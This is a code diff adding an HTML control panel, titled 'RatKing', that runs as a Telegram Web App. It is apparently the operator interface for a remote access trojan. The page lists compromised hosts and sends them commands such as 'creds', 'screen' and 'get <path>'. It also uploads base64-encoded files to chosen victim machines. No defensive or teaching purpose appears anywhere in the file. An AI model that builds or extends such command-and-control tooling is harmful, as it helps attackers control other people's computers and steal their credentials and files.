@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>RatKing Control Panel</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+  <style>
+    body { font-family: Arial, sans-serif; background: #181c20; color: #f1f1f1; margin: 0; padding: 0; }
+    .container { max-width: 500px; margin: 30px auto; background: #23272b; border-radius: 10px; box-shadow: 0 2px 8px #0008; padding: 24px; }
+    h1 { text-align: center; }
+    label, select, input, button { display: block; width: 100%; margin-bottom: 16px; }
+    button { background: #0088cc; color: #fff; border: none; padding: 12px; border-radius: 5px; font-size: 1em; cursor: pointer; }
+    button:hover { background: #005f8c; }
+    .output { background: #111; padding: 10px; border-radius: 5px; min-height: 60px; margin-top: 10px; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>RatKing Control Panel</h1>
+    <label for="hostSelect">Select Host Machine:</label>
+    <select id="hostSelect"></select>
+
+    <label for="commandInput">Command:</label>
+    <input id="commandInput" type="text" placeholder="Enter command (e.g. screen, creds, get <path>)" />
+    <button onclick="sendCommand()">Send Command</button>
+
+    <label for="fileInput">Upload File to Host:</label>
+    <input id="fileInput" type="file" />
+    <input id="fileTargetPath" type="text" placeholder="Target path (optional)" />
+    <button onclick="uploadFile()">Upload File</button>
+
+    <div class="output" id="output"></div>
+  </div>
+
+  <script>
+    // Example: Replace with actual hostnames from your backend/bot
+    const hosts = ["DESKTOP-123456", "LAPTOP-654321", "SERVER-001"];
+    const hostSelect = document.getElementById('hostSelect');
+    hosts.forEach(h => {
+      const opt = document.createElement('option');
+      opt.value = h; opt.textContent = h;
+      hostSelect.appendChild(opt);
+    });
+
+    function sendCommand() {
+      const host = hostSelect.value;
+      const cmd = document.getElementById('commandInput').value;
+      if (!cmd) return;
+      // Send command to bot via Telegram WebApp API
+      Telegram.WebApp.sendData(JSON.stringify({ type: 'command', host, cmd }));
+      showOutput(`Sent command to ${host}: ${cmd}`);
+    }
+
+    function uploadFile() {
+      const host = hostSelect.value;
+      const fileInput = document.getElementById('fileInput');
+      const file = fileInput.files[0];
+      const targetPath = document.getElementById('fileTargetPath').value;
+      if (!file) return showOutput('No file selected.');
+      // Read file as base64 and send to bot
+      const reader = new FileReader();
+      reader.onload = function(e) {
+        const base64 = e.target.result.split(',')[1];
+        Telegram.WebApp.sendData(JSON.stringify({
+          type: 'upload', host, filename: file.name, data: base64, targetPath
+        }));
+        showOutput(`Uploading ${file.name} to ${host}...`);
+      };
+      reader.readAsDataURL(file);
+    }
+
+    function showOutput(msg) {
+      document.getElementById('output').textContent = msg;
+    }
+  </script>
+</body>
+</html>
